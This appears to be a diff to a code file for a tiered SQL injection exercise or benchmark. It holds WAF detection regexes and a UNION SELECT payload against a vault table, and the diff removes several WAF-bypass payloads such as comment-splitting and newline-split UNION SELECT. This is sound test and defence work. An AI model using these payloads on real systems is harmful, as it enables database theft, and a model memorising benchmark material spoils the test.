@@ -1,71 +1,43 @@
-// SQLi — per-tier defence contract.
-// Pool of signature WAF rules a real WAF would carry for SQLi.
-// Canonical: ' UNION SELECT ...
-// Bypass: comment-splitting (/**/), which evades \bUNION\s+SELECT\b style rules.
+// SQLi data extraction — tiered.
+// T0: no WAF; the canonical UNION SELECT pulls the vault rows directly.
+// T1: a WAF blocks UNION comprehensively (incl comment-splitting via the
+//     u\W*n\W*i\W*o\W*n pattern), so NO direct extraction works — the only way
+//     to reach the vault canary is a blind boolean subquery oracle. The
+//     reference fireExploit tries UNION first, then falls back to blind.
 
+// Shared pool of signature SQLi WAF rules — imported by 15 other classes' T1
+// configs as decoy rules. Kept here for backwards compatibility.
 export const RULE_POOL = [
-  // Naive UNION SELECT (whitespace-separated)
   { name: 'sqli-union-select',  pattern: '\\bunion\\s+(all\\s+)?select\\b', flags: 'i' },
-  // Tautology OR 1=1 patterns
   { name: 'sqli-or-tautology',  pattern: "\\bor\\s+'?\\w+'?\\s*=\\s*'?\\w+'?", flags: 'i' },
-  // Stacked queries
   { name: 'sqli-stacked',       pattern: ';\\s*(select|insert|update|delete|drop)\\b', flags: 'i' },
-  // Time-based SLEEP / BENCHMARK
   { name: 'sqli-sleep',         pattern: '\\bsleep\\s*\\(', flags: 'i' },
   { name: 'sqli-benchmark',     pattern: '\\bbenchmark\\s*\\(', flags: 'i' },
-  // Schema enumeration
   { name: 'sqli-info-schema',   pattern: '\\binformation_schema\\b', flags: 'i' },
-  // SQL comment terminators directly after a quote
   { name: 'sqli-quote-comment', pattern: "'\\s*--", flags: 'i' },
-  // Hex literal evasion
   { name: 'sqli-hex',           pattern: '0x[0-9a-f]{6,}', flags: 'i' },
-]
-
-// Bypass: comment-splitting between UNION and SELECT defeats \s+ matching.
-// Hex schema names also pass through 0x rule (we generate ASCII names).
-export const BYPASS_TEMPLATES = [
-  // Comment-splitting
-  (canary, scenario) =>
-    `%' /**/UNION/**/SELECT/**/id,owner_session,data/**/FROM/**/${scenario.sensitiveTable}/**/--`,
-  // Parenthesised UNION
-  (canary, scenario) =>
-    `%') UNION(SELECT id,owner_session,data FROM ${scenario.sensitiveTable})--`,
-  // Newline-separated (some WAF \s+ rules use [ \t]+ only)
-  (canary, scenario) =>
-    `%'\nUNION\nSELECT id,owner_session,data FROM ${scenario.sensitiveTable}\n--`,
 ]
 
 export const defences = {
   0: {
-    canonicalPayload: (canary, scenario) =>
-      `%' UNION SELECT id, owner_session, data FROM ${scenario.sensitiveTable} --`,
+    canonicalPayload: (canary, scenario) => `zzx' UNION SELECT id, name, value FROM ${scenario.vaultTable} -- `,
     naiveBlockedExpected: false,
     bypassPayloads: [],
   },
   1: {
-    // Naive UNION SELECT is blocked by xss/sqli union-select rule.
-    // Comment-splitting bypass survives.
-    canonicalPayload: (canary, scenario) =>
-      `%' UNION SELECT id, owner_session, data FROM ${scenario.sensitiveTable} --`,
-    naiveBlockedExpected: true,
-    bypassPayloads: BYPASS_TEMPLATES,
+    // fireExploit ignores this string and auto-falls-back to blind extraction.
+    canonicalPayload: () => 'blind-boolean-extraction',
+    naiveBlockedExpected: false,
+    bypassPayloads: [],
   },
 }
 
 export function generateT1Config(rng = Math.random) {
-  // union-select rule is required (guarantees naive blocked)
-  const required = ['sqli-union-select']
-  const optional = RULE_POOL.filter(r => !required.includes(r.name))
-  const extraCount = 3 + Math.floor(rng() * (optional.length - 2))
-  const shuffled = [...optional].sort(() => rng() - 0.5)
-  const picked = [
-    ...RULE_POOL.filter(r => required.includes(r.name)),
-    ...shuffled.slice(0, extraCount),
-  ]
   const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
   return {
     waf: {
-      rules: picked,
+      // Blocks UNION even with comment/whitespace splitting (un/**/ion, u n i o n).
+      rules: [{ name: 'sqli-union', pattern: 'u\\W*n\\W*i\\W*o\\W*n', flags: 'i' }],
       blockPageStyle: styles[Math.floor(rng() * styles.length)],
     },
   }
